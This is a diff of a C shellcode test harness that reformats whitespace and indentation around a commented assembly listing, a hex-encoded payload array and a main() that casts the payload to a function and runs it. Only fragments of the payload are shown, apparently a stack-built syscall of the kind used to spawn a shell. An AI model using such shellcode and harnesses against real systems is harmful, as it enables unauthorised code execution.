@@ -18,7 +18,8 @@ push rdi
 xor byte [rsp+7], 0xff ; fix null byte
 mov rdi, rsp
 syscall
- */
+*/
+
 
 #include<stdio.h>
 #include<string.h>
@@ -35,7 +36,8 @@ unsigned char payload[] =
 "\x48\x89\xe7"
 "\x0f\x05";
 
+
 void main() {
-printf("Shellcode Length: %d\n", (int) strlen(payload));
-(*(void (*)()) payload)();
+	printf("Shellcode Length: %d\n", (int) strlen(payload));
+	(*(void (*)()) payload)();
 }
